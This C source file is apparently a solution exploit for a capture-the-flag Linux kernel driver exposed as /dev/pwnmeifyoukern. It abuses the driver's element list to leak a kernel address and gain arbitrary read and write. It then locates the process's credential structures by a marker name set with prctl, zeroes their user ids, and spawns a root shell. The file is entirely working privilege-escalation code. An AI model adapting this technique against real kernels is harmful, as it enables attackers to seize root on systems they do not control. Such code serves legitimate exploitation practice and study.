#define _GNU_SOURCE

#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <sys/prctl.h>
#include <unistd.h>

#define OFFSET_TASKS 0x1d0
#define OFFSET_PID 0x278
#define OFFSET_CRED 0x3c0

struct element_s
{
    char content[0x100];
    size_t size;
    struct element_s *next;
};

int main()
{
    int fd;
    char payload[0x1000];

    system("id");

    memset(payload, 0, 0x1000);

    struct element_s leak;

    printf("[+] Open device\n");
    fd = open("/dev/pwnmeifyoukern", O_RDWR);

    printf("[+] Create 2 elements\n");
    ((int *)payload)[0] = 1;
    // Add a buffer content of length 0x100
    write(fd, payload, 4);
    write(fd, payload, sizeof(struct element_s) + sizeof(int));

    printf("[+] Leak kernel address\n");
    read(fd, &leak, sizeof(leak));

    printf("[+] Next: %p\n", leak.next);

    // Just read complete region and replace everything that could be your user id ;)
    char *kernel_mem = malloc(0x1000000);

    void *base = (void *)((long)leak.next & 0xfffffffff0000000);
    printf("[+] Kernel base: %p\n", (void *)base);

    base += 0x6610000;

    ((int *)payload)[0] = 0;
    ((int *)payload)[1] = 0;
    *((void **)(payload + 0x110)) = base + 0x100;

    write(fd, payload, 0x118);

    ((int *)payload)[1] = 1;
    ((size_t *)payload)[1] = 0xffffffffffffffff;
    write(fd, payload, 16);

    ((int *)payload)[1] = 0;
    ((int *)payload)[2] = 0;
    ((int *)payload)[3] = 0;
    *((void **)(payload + 0x110)) = base;
    write(fd, payload, 0x118);
    write(fd, payload, 8);

    // Set comm field to something recognizable by using prctl
    prctl(PR_SET_NAME, "1337GETR00T1337");

    read(fd, kernel_mem, 0x1000000);

    // Search for the cred structure by looking for the comm field
    size_t addr = 0;
    while (strcmp(kernel_mem + addr, "1337GETR00T1337"))
        addr++;

    void *real_cred = *(void **)(kernel_mem + addr - 0x10);

    printf("[+] real_cred: %p\n", real_cred);

    void *cred = *(void **)(kernel_mem + addr - 0x8);

    printf("[+] cred: %p\n", cred);

    printf("[+] Overwriting real_cred\n");

    payload[0] = 0;
    payload[1] = 0;
    *((void **)(payload + 0x110)) = real_cred;

    write(fd, payload, 0x118);
    write(fd, "\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 28);

    printf("[+] Overwriting cred\n");

    payload[0] = 0;
    payload[1] = 0;
    *((void **)(payload + 0x110)) = cred;

    write(fd, payload, 0x118);
    write(fd, "\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 28);

    setresuid(0, 0, 0);
    system("id");
    execlp("/bin/sh", "/bin/sh", NULL);
}
